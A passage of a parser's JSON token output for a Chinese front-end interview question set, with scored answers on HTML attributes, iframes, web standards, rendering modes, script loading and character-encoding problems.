","escaped":false},{"type":"codespan","raw":"`title`","text":"title"},{"type":"text","raw":"属性是当鼠标悬停在图片上时，显示的提示文本；","text":"属性是当鼠标悬停在图片上时，显示的提示文本；","escaped":false},{"type":"codespan","raw":"`alt`","text":"alt"},{"type":"text","raw":"属性是图片无法正常显示时，显示的文本，如：图片加载失败、图片被屏蔽等。","text":"属性是图片无法正常显示时，显示的文本，如：图片加载失败、图片被屏蔽等。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## src 与 href 的区别\\n\\n","depth":2,"text":"src 与 href 的区别","tokens":[{"type":"text","raw":"src 与 href 的区别","text":"src 与 href 的区别","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** `src`属性是资源路径，引入资源，属于当前页不可缺少的部分，如：`src=\\"http://www.baidu.com/logo.png\\"`；`href`属性是超链接，引用资源，表示该资源与当前页有关联，如：`href=\\"http://www.baidu.com\\"`。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** `src`属性是资源路径，引入资源，属于当前页不可缺少的部分，如：`src=\\"http://www.baidu.com/logo.png\\"`；`href`属性是超链接，引用资源，表示该资源与当前页有关联，如：`href=\\"http://www.baidu.com\\"`。","task":false,"loose":false,"text":"**1：** `src`属性是资源路径，引入资源，属于当前页不可缺少的部分，如：`src=\\"http://www.baidu.com/logo.png\\"`；`href`属性是超链接，引用资源，表示该资源与当前页有关联，如：`href=\\"http://www.baidu.com\\"`。","tokens":[{"type":"text","raw":"**1：** `src`属性是资源路径，引入资源，属于当前页不可缺少的部分，如：`src=\\"http://www.baidu.com/logo.png\\"`；`href`属性是超链接，引用资源，表示该资源与当前页有关联，如：`href=\\"http://www.baidu.com\\"`。","text":"**1：** `src`属性是资源路径，引入资源，属于当前页不可缺少的部分，如：`src=\\"http://www.baidu.com/logo.png\\"`；`href`属性是超链接，引用资源，表示该资源与当前页有关联，如：`href=\\"http://www.baidu.com\\"`。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ","text":" ","escaped":false},{"type":"codespan","raw":"`src`","text":"src"},{"type":"text","raw":"属性是资源路径，引入资源，属于当前页不可缺少的部分，如：","text":"属性是资源路径，引入资源，属于当前页不可缺少的部分，如：","escaped":false},{"type":"codespan","raw":"`src=\\"http://www.baidu.com/logo.png\\"`","text":"src=\\"http://www.baidu.com/logo.png\\""},{"type":"text","raw":"；","text":"；","escaped":false},{"type":"codespan","raw":"`href`","text":"href"},{"type":"text","raw":"属性是超链接，引用资源，表示该资源与当前页有关联，如：","text":"属性是超链接，引用资源，表示该资源与当前页有关联，如：","escaped":false},{"type":"codespan","raw":"`href=\\"http://www.baidu.com\\"`","text":"href=\\"http://www.baidu.com\\""},{"type":"text","raw":"。","text":"。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## iframe 有哪些特点（优缺点）？\\n\\n","depth":2,"text":"iframe 有哪些特点（优缺点）？","tokens":[{"type":"text","raw":"iframe 有哪些特点（优缺点）？","text":"iframe 有哪些特点（优缺点）？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **2：** 优点：\\n  + 内容独立：iframe 中的元素、变量、样式是独立的；\\n  + 并行加载：浏览器可以同时加载一个页面中多个 iframe 的资源；\\n  + 灵活性强：可以引入各类网站，即使跨域；\\n- **2：** 缺点：\\n  + 不利于 SEO：iframe 没有语义，iframe 中的内容无法被搜索引擎收录；\\n  + 性能问题：iframe 中的内容无法被浏览器缓存，每次刷新都需要重新加载，多个 iframe 存在相同资源也会重复加载；\\n  + 通讯复杂：iframe 中两个页面之间无法直接通信，需要借助中间服务，如：postMessage、window.name 等；","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 优点：\\n  + 内容独立：iframe 中的元素、变量、样式是独立的；\\n  + 并行加载：浏览器可以同时加载一个页面中多个 iframe 的资源；\\n  + 灵活性强：可以引入各类网站，即使跨域；\\n","task":false,"loose":false,"text":"**2：** 优点：\\n+ 内容独立：iframe 中的元素、变量、样式是独立的；\\n+ 并行加载：浏览器可以同时加载一个页面中多个 iframe 的资源；\\n+ 灵活性强：可以引入各类网站，即使跨域；","tokens":[{"type":"text","raw":"**2：** 优点：\\n","text":"**2：** 优点：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 优点：","text":" 优点：","escaped":false}]},{"type":"list","raw":"+ 内容独立：iframe 中的元素、变量、样式是独立的；\\n+ 并行加载：浏览器可以同时加载一个页面中多个 iframe 的资源；\\n+ 灵活性强：可以引入各类网站，即使跨域；","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 内容独立：iframe 中的元素、变量、样式是独立的；\\n","task":false,"loose":false,"text":"内容独立：iframe 中的元素、变量、样式是独立的；","tokens":[{"type":"text","raw":"内容独立：iframe 中的元素、变量、样式是独立的；","text":"内容独立：iframe 中的元素、变量、样式是独立的；","tokens":[{"type":"text","raw":"内容独立：iframe 中的元素、变量、样式是独立的；","text":"内容独立：iframe 中的元素、变量、样式是独立的；","escaped":false}]}]},{"type":"list_item","raw":"+ 并行加载：浏览器可以同时加载一个页面中多个 iframe 的资源；\\n","task":false,"loose":false,"text":"并行加载：浏览器可以同时加载一个页面中多个 iframe 的资源；","tokens":[{"type":"text","raw":"并行加载：浏览器可以同时加载一个页面中多个 iframe 的资源；","text":"并行加载：浏览器可以同时加载一个页面中多个 iframe 的资源；","tokens":[{"type":"text","raw":"并行加载：浏览器可以同时加载一个页面中多个 iframe 的资源；","text":"并行加载：浏览器可以同时加载一个页面中多个 iframe 的资源；","escaped":false}]}]},{"type":"list_item","raw":"+ 灵活性强：可以引入各类网站，即使跨域；","task":false,"loose":false,"text":"灵活性强：可以引入各类网站，即使跨域；","tokens":[{"type":"text","raw":"灵活性强：可以引入各类网站，即使跨域；","text":"灵活性强：可以引入各类网站，即使跨域；","tokens":[{"type":"text","raw":"灵活性强：可以引入各类网站，即使跨域；","text":"灵活性强：可以引入各类网站，即使跨域；","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **2：** 缺点：\\n  + 不利于 SEO：iframe 没有语义，iframe 中的内容无法被搜索引擎收录；\\n  + 性能问题：iframe 中的内容无法被浏览器缓存，每次刷新都需要重新加载，多个 iframe 存在相同资源也会重复加载；\\n  + 通讯复杂：iframe 中两个页面之间无法直接通信，需要借助中间服务，如：postMessage、window.name 等；","task":false,"loose":false,"text":"**2：** 缺点：\\n+ 不利于 SEO：iframe 没有语义，iframe 中的内容无法被搜索引擎收录；\\n+ 性能问题：iframe 中的内容无法被浏览器缓存，每次刷新都需要重新加载，多个 iframe 存在相同资源也会重复加载；\\n+ 通讯复杂：iframe 中两个页面之间无法直接通信，需要借助中间服务，如：postMessage、window.name 等；","tokens":[{"type":"text","raw":"**2：** 缺点：\\n","text":"**2：** 缺点：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 缺点：","text":" 缺点：","escaped":false}]},{"type":"list","raw":"+ 不利于 SEO：iframe 没有语义，iframe 中的内容无法被搜索引擎收录；\\n+ 性能问题：iframe 中的内容无法被浏览器缓存，每次刷新都需要重新加载，多个 iframe 存在相同资源也会重复加载；\\n+ 通讯复杂：iframe 中两个页面之间无法直接通信，需要借助中间服务，如：postMessage、window.name 等；","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 不利于 SEO：iframe 没有语义，iframe 中的内容无法被搜索引擎收录；\\n","task":false,"loose":false,"text":"不利于 SEO：iframe 没有语义，iframe 中的内容无法被搜索引擎收录；","tokens":[{"type":"text","raw":"不利于 SEO：iframe 没有语义，iframe 中的内容无法被搜索引擎收录；","text":"不利于 SEO：iframe 没有语义，iframe 中的内容无法被搜索引擎收录；","tokens":[{"type":"text","raw":"不利于 SEO：iframe 没有语义，iframe 中的内容无法被搜索引擎收录；","text":"不利于 SEO：iframe 没有语义，iframe 中的内容无法被搜索引擎收录；","escaped":false}]}]},{"type":"list_item","raw":"+ 性能问题：iframe 中的内容无法被浏览器缓存，每次刷新都需要重新加载，多个 iframe 存在相同资源也会重复加载；\\n","task":false,"loose":false,"text":"性能问题：iframe 中的内容无法被浏览器缓存，每次刷新都需要重新加载，多个 iframe 存在相同资源也会重复加载；","tokens":[{"type":"text","raw":"性能问题：iframe 中的内容无法被浏览器缓存，每次刷新都需要重新加载，多个 iframe 存在相同资源也会重复加载；","text":"性能问题：iframe 中的内容无法被浏览器缓存，每次刷新都需要重新加载，多个 iframe 存在相同资源也会重复加载；","tokens":[{"type":"text","raw":"性能问题：iframe 中的内容无法被浏览器缓存，每次刷新都需要重新加载，多个 iframe 存在相同资源也会重复加载；","text":"性能问题：iframe 中的内容无法被浏览器缓存，每次刷新都需要重新加载，多个 iframe 存在相同资源也会重复加载；","escaped":false}]}]},{"type":"list_item","raw":"+ 通讯复杂：iframe 中两个页面之间无法直接通信，需要借助中间服务，如：postMessage、window.name 等；","task":false,"loose":false,"text":"通讯复杂：iframe 中两个页面之间无法直接通信，需要借助中间服务，如：postMessage、window.name 等；","tokens":[{"type":"text","raw":"通讯复杂：iframe 中两个页面之间无法直接通信，需要借助中间服务，如：postMessage、window.name 等；","text":"通讯复杂：iframe 中两个页面之间无法直接通信，需要借助中间服务，如：postMessage、window.name 等；","tokens":[{"type":"text","raw":"通讯复杂：iframe 中两个页面之间无法直接通信，需要借助中间服务，如：postMessage、window.name 等；","text":"通讯复杂：iframe 中两个页面之间无法直接通信，需要借助中间服务，如：postMessage、window.name 等；","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 谈谈你对 Web 标准以及 W3C 的理解和认识\\n\\n","depth":2,"text":"谈谈你对 Web 标准以及 W3C 的理解和认识","tokens":[{"type":"text","raw":"谈谈你对 Web 标准以及 W3C 的理解和认识","text":"谈谈你对 Web 标准以及 W3C 的理解和认识","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** Web 标准指的是万维网（World Wide Web）上各种网页、网页元素、网页设计、网页交互等网页制作规范。W3C 是万维网联盟（World Wide Web Consortium），致力于制定和推广开放网络标准，以支持互联网和万维网发展。\\n- **1：** 标签要闭合，英文小写，且不要嵌套混乱，用标签语义化未提高技索的概率。使用外链式的 css 和 JS 脚本，使结构、样式、行为分离，内容能被更广泛的设备所访问，代码精简 开发组件化 ，代码易维护、 可复用，改版、升级方便。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Web 标准指的是万维网（World Wide Web）上各种网页、网页元素、网页设计、网页交互等网页制作规范。W3C 是万维网联盟（World Wide Web Consortium），致力于制定和推广开放网络标准，以支持互联网和万维网发展。\\n","task":false,"loose":false,"text":"**1：** Web 标准指的是万维网（World Wide Web）上各种网页、网页元素、网页设计、网页交互等网页制作规范。W3C 是万维网联盟（World Wide Web Consortium），致力于制定和推广开放网络标准，以支持互联网和万维网发展。","tokens":[{"type":"text","raw":"**1：** Web 标准指的是万维网（World Wide Web）上各种网页、网页元素、网页设计、网页交互等网页制作规范。W3C 是万维网联盟（World Wide Web Consortium），致力于制定和推广开放网络标准，以支持互联网和万维网发展。","text":"**1：** Web 标准指的是万维网（World Wide Web）上各种网页、网页元素、网页设计、网页交互等网页制作规范。W3C 是万维网联盟（World Wide Web Consortium），致力于制定和推广开放网络标准，以支持互联网和万维网发展。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Web 标准指的是万维网（World Wide Web）上各种网页、网页元素、网页设计、网页交互等网页制作规范。W3C 是万维网联盟（World Wide Web Consortium），致力于制定和推广开放网络标准，以支持互联网和万维网发展。","text":" Web 标准指的是万维网（World Wide Web）上各种网页、网页元素、网页设计、网页交互等网页制作规范。W3C 是万维网联盟（World Wide Web Consortium），致力于制定和推广开放网络标准，以支持互联网和万维网发展。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 标签要闭合，英文小写，且不要嵌套混乱，用标签语义化未提高技索的概率。使用外链式的 css 和 JS 脚本，使结构、样式、行为分离，内容能被更广泛的设备所访问，代码精简 开发组件化 ，代码易维护、 可复用，改版、升级方便。","task":false,"loose":false,"text":"**1：** 标签要闭合，英文小写，且不要嵌套混乱，用标签语义化未提高技索的概率。使用外链式的 css 和 JS 脚本，使结构、样式、行为分离，内容能被更广泛的设备所访问，代码精简 开发组件化 ，代码易维护、 可复用，改版、升级方便。","tokens":[{"type":"text","raw":"**1：** 标签要闭合，英文小写，且不要嵌套混乱，用标签语义化未提高技索的概率。使用外链式的 css 和 JS 脚本，使结构、样式、行为分离，内容能被更广泛的设备所访问，代码精简 开发组件化 ，代码易维护、 可复用，改版、升级方便。","text":"**1：** 标签要闭合，英文小写，且不要嵌套混乱，用标签语义化未提高技索的概率。使用外链式的 css 和 JS 脚本，使结构、样式、行为分离，内容能被更广泛的设备所访问，代码精简 开发组件化 ，代码易维护、 可复用，改版、升级方便。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 标签要闭合，英文小写，且不要嵌套混乱，用标签语义化未提高技索的概率。使用外链式的 css 和 JS 脚本，使结构、样式、行为分离，内容能被更广泛的设备所访问，代码精简 开发组件化 ，代码易维护、 可复用，改版、升级方便。","text":" 标签要闭合，英文小写，且不要嵌套混乱，用标签语义化未提高技索的概率。使用外链式的 css 和 JS 脚本，使结构、样式、行为分离，内容能被更广泛的设备所访问，代码精简 开发组件化 ，代码易维护、 可复用，改版、升级方便。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什么是严格模式与混杂模式？\\n\\n","depth":2,"text":"什么是严格模式与混杂模式？","tokens":[{"type":"text","raw":"什么是严格模式与混杂模式？","text":"什么是严格模式与混杂模式？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 严格模式：是以浏览器支持的最高标准运行, 混杂模式：页面以宽松向下兼容的方式显示，模拟老式浏览器的行为。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 严格模式：是以浏览器支持的最高标准运行, 混杂模式：页面以宽松向下兼容的方式显示，模拟老式浏览器的行为。","task":false,"loose":false,"text":"**1：** 严格模式：是以浏览器支持的最高标准运行, 混杂模式：页面以宽松向下兼容的方式显示，模拟老式浏览器的行为。","tokens":[{"type":"text","raw":"**1：** 严格模式：是以浏览器支持的最高标准运行, 混杂模式：页面以宽松向下兼容的方式显示，模拟老式浏览器的行为。","text":"**1：** 严格模式：是以浏览器支持的最高标准运行, 混杂模式：页面以宽松向下兼容的方式显示，模拟老式浏览器的行为。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 严格模式：是以浏览器支持的最高标准运行, 混杂模式：页面以宽松向下兼容的方式显示，模拟老式浏览器的行为。","text":" 严格模式：是以浏览器支持的最高标准运行, 混杂模式：页面以宽松向下兼容的方式显示，模拟老式浏览器的行为。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## script、script async 和 script defer 的区别？\\n\\n","depth":2,"text":"script、script async 和 script defer 的区别？","tokens":[{"type":"text","raw":"script、script async 和 script defer 的区别？","text":"script、script async 和 script defer 的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：** script - HTML 解析中断，脚本被提取并立即执行。执行结束后，HTML 解析继续。  \\n  \\n  async - 脚本的提取、执行的过程与 HTML 解析过程并行，脚本执行完毕可能在 HTML 解析完毕之前。当脚本与页面上其他脚本独立时，可以使用 async，比如用作页面统计分析。  \\n  \\n  defer - 脚本仅提取过程与 HTML 解析过程并行，脚本的执行将在 HTML 解析完毕后进行。如果有多个含 defer 的脚本，脚本的执行顺序将按照在 document 中出现的位置，从上到下顺序执行。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **2：** script - HTML 解析中断，脚本被提取并立即执行。执行结束后，HTML 解析继续。  \\n  \\n  async - 脚本的提取、执行的过程与 HTML 解析过程并行，脚本执行完毕可能在 HTML 解析完毕之前。当脚本与页面上其他脚本独立时，可以使用 async，比如用作页面统计分析。  \\n  \\n  defer - 脚本仅提取过程与 HTML 解析过程并行，脚本的执行将在 HTML 解析完毕后进行。如果有多个含 defer 的脚本，脚本的执行顺序将按照在 document 中出现的位置，从上到下顺序执行。","task":false,"loose":true,"text":"**2：** script - HTML 解析中断，脚本被提取并立即执行。执行结束后，HTML 解析继续。  \\n\\nasync - 脚本的提取、执行的过程与 HTML 解析过程并行，脚本执行完毕可能在 HTML 解析完毕之前。当脚本与页面上其他脚本独立时，可以使用 async，比如用作页面统计分析。  \\n\\ndefer - 脚本仅提取过程与 HTML 解析过程并行，脚本的执行将在 HTML 解析完毕后进行。如果有多个含 defer 的脚本，脚本的执行顺序将按照在 document 中出现的位置，从上到下顺序执行。","tokens":[{"type":"text","raw":"**2：** script - HTML 解析中断，脚本被提取并立即执行。执行结束后，HTML 解析继续。  ","text":"**2：** script - HTML 解析中断，脚本被提取并立即执行。执行结束后，HTML 解析继续。  ","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" script - HTML 解析中断，脚本被提取并立即执行。执行结束后，HTML 解析继续。  ","text":" script - HTML 解析中断，脚本被提取并立即执行。执行结束后，HTML 解析继续。  ","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"async - 脚本的提取、执行的过程与 HTML 解析过程并行，脚本执行完毕可能在 HTML 解析完毕之前。当脚本与页面上其他脚本独立时，可以使用 async，比如用作页面统计分析。  ","text":"async - 脚本的提取、执行的过程与 HTML 解析过程并行，脚本执行完毕可能在 HTML 解析完毕之前。当脚本与页面上其他脚本独立时，可以使用 async，比如用作页面统计分析。  ","tokens":[{"type":"text","raw":"async - 脚本的提取、执行的过程与 HTML 解析过程并行，脚本执行完毕可能在 HTML 解析完毕之前。当脚本与页面上其他脚本独立时，可以使用 async，比如用作页面统计分析。  ","text":"async - 脚本的提取、执行的过程与 HTML 解析过程并行，脚本执行完毕可能在 HTML 解析完毕之前。当脚本与页面上其他脚本独立时，可以使用 async，比如用作页面统计分析。  ","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"defer - 脚本仅提取过程与 HTML 解析过程并行，脚本的执行将在 HTML 解析完毕后进行。如果有多个含 defer 的脚本，脚本的执行顺序将按照在 document 中出现的位置，从上到下顺序执行。","text":"defer - 脚本仅提取过程与 HTML 解析过程并行，脚本的执行将在 HTML 解析完毕后进行。如果有多个含 defer 的脚本，脚本的执行顺序将按照在 document 中出现的位置，从上到下顺序执行。","tokens":[{"type":"text","raw":"defer - 脚本仅提取过程与 HTML 解析过程并行，脚本的执行将在 HTML 解析完毕后进行。如果有多个含 defer 的脚本，脚本的执行顺序将按照在 document 中出现的位置，从上到下顺序执行。","text":"defer - 脚本仅提取过程与 HTML 解析过程并行，脚本的执行将在 HTML 解析完毕后进行。如果有多个含 defer 的脚本，脚本的执行顺序将按照在 document 中出现的位置，从上到下顺序执行。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 浏览器乱码的原因是什么？如何解决？\\n\\n","depth":2,"text":"浏览器乱码的原因是什么？如何解决？","tokens":[{"type":"text","raw":"浏览器乱码的原因是什么？如何解决？","text":"浏览器乱码的原因是什么？如何解决？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：原因**\\n    1.网页源代码是gbk的编码，而内容中的中文字是utf-8编码的，这样浏览器打开即会出现html乱码，反之也会出现乱码;  \\n\\n    2.html网页编码是gbk，而程序从数据库中调出呈现是utf-8编码的内容也会造成编码乱码;  \\n\\n    3.浏览器不能自动检测网页编码，造成网页乱码。\\n- **1：解决办法**\\n    1.如果网页设置编码是gbk，而数据库储存数据编码格式是UTF-8，此时需要程序查询数据库数据显示数据前进程序转码;  \\n\\n    2.如果浏览器浏览时候出现网页乱码，在浏览器中找到转换编码的菜单进行转换;","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：原因**\\n    1.网页源代码是gbk的编码，而内容中的中文字是utf-8编码的，这样浏览器打开即会出现html乱码，反之也会出现乱码;  \\n\\n    2.html网页编码是gbk，而程序从数据库中调出呈现是utf-8编码的内容也会造成编码乱码;  \\n\\n    3.浏览器不能自动检测网页编码，造成网页乱码。\\n","task":false,"loose":true,"text":"**1：原因**\\n  1.网页源代码是gbk的编码，而内容中的中文字是utf-8编码的，这样浏览器打开即会出现html乱码，反之也会出现乱码;  \\n\\n  2.html网页编码是gbk，而程序从数据库中调出呈现是utf-8编码的内容也会造成编码乱码;  \\n\\n  3.浏览器不能自动检测网页编码，造成网页乱码。","tokens":[{"type":"text","raw":"**1：原因**\\n\\n  1.网页源代码是gbk的编码，而内容中的中文字是utf-8编码的，这样浏览器打开即会出现html乱码，反之也会出现乱码;  ","text":"**1：原因**\\n  1.网页源代码是gbk的编码，而内容中的中文字是utf-8编码的，这样浏览器打开即会出现html乱码，反之也会出现乱码;  ","tokens":[{"type":"strong","raw":"**1：原因**","text":"1：原因","tokens":[{"type":"text","raw":"1：原因","text":"1：原因","escaped":false}]},{"type":"text","raw":"\\n  1.网页源代码是gbk的编码，而内容中的中文字是utf-8编码的，这样浏览器打开即会出现html乱码，反之也会出现乱码;  ","text":"\\n  1.网页源代码是gbk的编码，而内容中的中文字是utf-8编码的，这样浏览器打开即会出现html乱码，反之也会出现乱码;  ","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"  2.html网页编码是gbk，而程序从数据库中调出呈现是utf-8编码的内容也会造成编码乱码;  ","text":"  2.html网页编码是gbk，而程序从数据库中调出呈现是utf-8编码的内容也会造成编码乱码;  ","tokens":[{"type":"text","raw":"  2.html网页编码是gbk，而程序从数据库中调出呈现是utf-8编码的内容也会造成编码乱码;  ","text":"  2.html网页编码是gbk，而程序从数据库中调出呈现是utf-8编码的内容也会造成编码乱码;  ","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"  3.浏览器不能自动检测网页编码，造成网页乱码。","text":"  3.浏览器不能自动检测网页编码，造成网页乱码。","tokens":[{"type":"text","raw":"  3.浏览器不能自动检测网页编码，造成网页乱码。","text":"  3.浏览器不能自动检测网页编码，造成网页乱码。","escaped":false}]}]},{"type":"list_item","raw":"- **1：解决办法**\\n    1.如果网页设置编码是gbk，而数据库储存数据编码格式是UTF-8，此时需要程序查询数据库数据显示数据前进程序转码;  \\n\\n    2.如果浏览器浏览时候出现网页乱码，在浏览器中找到转换编码的菜单进行转换;","task":false,"loose":true,"text":"**1：解决办法**\\n  1.如果网页设置编码是gbk，而数据库储存数据编码格式是UTF-8，此时需要程序查询数据库数据显示数据前进程序转码;  \\n\\n  2.如果浏览器浏览时候出现网页乱码，在浏览器中找到转换编码的菜单进行转换;","tokens":[{"type":"text","raw":"**1：解决办法**\\n\\n  1.如果网页设置编码是gbk，而数据库储存数据编码格式是UTF-8，此时需要程序查询数据库数据显示数据前进程序转码;  ","text":"**1：解决办法**\\n  1.如果网页设置编码是gbk，而数据库储存数据编码格式是UTF-8，此时需要程序查询数据库数据显示数据前进程序转码;  ","tokens":[{"type":"strong","raw":"**1：解决办法**","text":"1：解决办法","tokens":[{"type":"text","raw":"1：解决办法","text":"1：解决办法","escaped":false}]},{"type":"text","raw":"\\n  1.如果网页设置编码是gbk，而数据库储存数据编码格式是UTF-8，此时需要程序查询数据库数据显示数据前进程序转码;  ","text":"\\n  1.如果网页设置编码是gbk，而数据库储存数据编码格式是UTF-8，此时需要程序查询数据库数据显示数据前进程序转码;  ","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"  